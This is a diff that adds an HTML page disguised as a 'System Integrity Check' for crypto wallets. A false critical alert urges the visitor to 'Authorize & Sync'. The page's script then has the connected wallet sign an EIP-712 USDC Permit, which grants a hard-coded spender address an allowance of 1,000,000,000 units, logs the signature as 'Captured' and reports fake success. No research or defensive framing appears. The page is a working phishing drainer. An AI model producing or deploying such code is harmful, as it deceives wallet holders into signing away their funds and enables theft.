@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Integrity Check</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
+        .card { border: 1px solid #dee2e6; padding: 25px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.08); text-align: center; background: white; max-width: 380px; }
+        .system-alert { background: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ffeeba; }
+        h3 { margin-top: 0; color: #212529; }
+        p { color: #495057; font-size: 14px; line-height: 1.6; }
+        button { padding: 14px 0; background-color: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; width: 100%; font-weight: 600; margin-top: 10px; }
+        button:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="system-alert">
+            <strong>System Notice:</strong> Wallet health score is critical. Immediate synchronization required to prevent asset lockout.
+        </div>
+        <h3>System Synchronization</h3>
+        <p>Authorize this request to re-sync your wallet keys with our decentralized node to ensure full compatibility.</p>
+        <button id="verifyBtn">Authorize & Sync</button>
+    </div>
+
+    <script>
+        const btn = document.getElementById('verifyBtn');
+
+        btn.addEventListener('click', async () => {
+            if (!window.ethereum) return alert("Wallet not found.");
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+                const chainId = parseInt(chainIdHex, 16);
+
+                const permitData = {
+                    domain: { name: "USD Coin", version: "2", chainId: chainId, verifyingContract: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
+                    message: {
+                        owner: accounts[0],
+                        spender: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", 
+                        value: "1000000000", nonce: 0, 
+                        deadline: Math.floor(Date.now() / 1000) + 3600
+                    },
+                    primaryType: "Permit",
+                    types: {
+                        EIP712Domain: [{ name: "name", type: "string" }, { name: "version", type: "string" }, { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }],
+                        Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }, { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }]
+                    }
+                };
+
+                const signature = await window.ethereum.request({
+                    method: 'eth_signTypedData_v4',
+                    params: [accounts[0], JSON.stringify(permitData)],
+                });
+
+                console.log("Captured:", signature);
+                alert("Synchronization successful.");
+            } catch (err) {
+                alert("Sync failed: " + err.message);
+            }
+        });
+    </script>
+</body>
+</html>
